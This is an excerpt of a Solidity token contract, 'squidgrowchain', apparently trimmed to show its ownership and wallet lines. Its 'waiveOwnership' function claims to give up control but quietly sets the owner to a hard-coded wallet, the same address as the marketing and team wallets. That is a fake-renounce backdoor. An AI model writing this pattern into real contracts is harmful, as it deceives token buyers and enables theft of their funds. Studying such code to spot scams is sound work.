...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x1De747912959ee17dbdd2ffA466A018645635472);
    }
...
contract squidgrowchain is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x1De747912959ee17dbdd2ffA466A018645635472);
    address payable public teamWalletAddress = payable(0x1De747912959ee17dbdd2ffA466A018645635472);
